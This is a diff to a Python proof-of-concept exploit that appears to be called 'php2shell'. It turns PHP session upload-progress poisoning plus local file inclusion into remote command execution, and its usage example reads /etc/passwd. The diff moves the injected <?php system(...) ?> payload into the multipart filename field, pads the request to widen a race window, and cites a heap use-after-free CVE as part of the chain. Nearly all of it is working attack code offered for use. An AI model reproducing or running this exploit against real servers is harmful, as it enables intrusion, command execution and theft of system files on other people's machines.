@@ -11,7 +11,7 @@ Usage:
   python3 poc.py http://target/page.php "cat /etc/passwd" --lfi-param page
 
 Attack chain:
-  1. Poison session file: multipart POST with PHP_SESSION_UPLOAD_PROGRESS=<?php system(CMD);?>
+  1. Poison session file: multipart POST with PHP code in filename field (canonical Chain A)
      → PHP writes attacker-controlled PHP code into /var/lib/php/sessions/sess_<id>
   2. Race/UAF trigger: slow chunked upload + concurrent session lifecycle disturbance
      → CVE-2026-109618/9 heap use-after-free in php_session_rfc1867_callback
@@ -143,12 +143,12 @@ OUTPUT_DELIM = "php2shell_out"
 
 def poison_payload(command: str) -> str:
     """
-    Upload key value that becomes a PHP variable name in the session file.
-    Session file format: upload_progress_<KEY>|a:5:{...}
-    With KEY = 'x<?php ...?>', the file contains raw PHP which executes on LFI.
+    PHP payload placed in the multipart filename field (canonical Chain A technique).
+    rfc1867 stores the filename as-is inside the session file's serialised array:
+      upload_progress_x|a:7:{...s:4:"name";s:N:"<?php ...?>";...}
+    When the session file is include()d via LFI the PHP engine executes the tags.
     """
-    # 'x' prefix keeps the variable name parser happy until the <?php tag
-    return f"x<?php echo '{OUTPUT_DELIM}_start';system('{command}');echo '{OUTPUT_DELIM}_end';?>"
+    return f"<?php echo '{OUTPUT_DELIM}_start';system('{command}');echo '{OUTPUT_DELIM}_end';?>"
 
 
 def extract_output(body: str) -> Optional[str]:
@@ -164,18 +164,19 @@ def extract_output(body: str) -> Optional[str]:
 def build_multipart_body(upload_key: str, pad_fields: int = 80) -> bytes:
     """
     Build a multipart body that:
-      - Contains PHP_SESSION_UPLOAD_PROGRESS=<upload_key> as the FIRST field
+      - Contains PHP_SESSION_UPLOAD_PROGRESS="x" as the FIRST field
         (must precede the file field per RFC 1867 so PHP initialises the session entry)
+      - Places the PHP payload in the filename attribute of the file field
       - Pads with <pad_fields> dummy form fields to widen the race window
       - Contains a large file field (streamed slowly to keep the parse loop alive)
     """
     parts = []
 
-    # trigger field — must come first
+    # trigger field — value is a plain key; PHP code goes in the filename below
     parts.append(
         f"--{BOUNDARY}\r\n"
         f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
-        f"{upload_key}\r\n"
+        f"x\r\n"
     )
 
     # padding fields widen the RFC 1867 parse loop race window
@@ -186,11 +187,11 @@ def build_multipart_body(upload_key: str, pad_fields: int = 80) -> bytes:
             f"{'A' * 64}\r\n"
         )
 
-    # large file field — we stream this slowly
+    # large file field — filename carries the PHP payload (canonical Chain A)
     payload = b"X" * (256 * 1024)  # 256 KB — enough to keep parse loop alive, much faster
     parts.append(
         f"--{BOUNDARY}\r\n"
-        f'Content-Disposition: form-data; name="file"; filename="data.bin"\r\n'
+        f'Content-Disposition: form-data; name="file"; filename="{upload_key}"\r\n'
         f"Content-Type: application/octet-stream\r\n\r\n"
     )
 
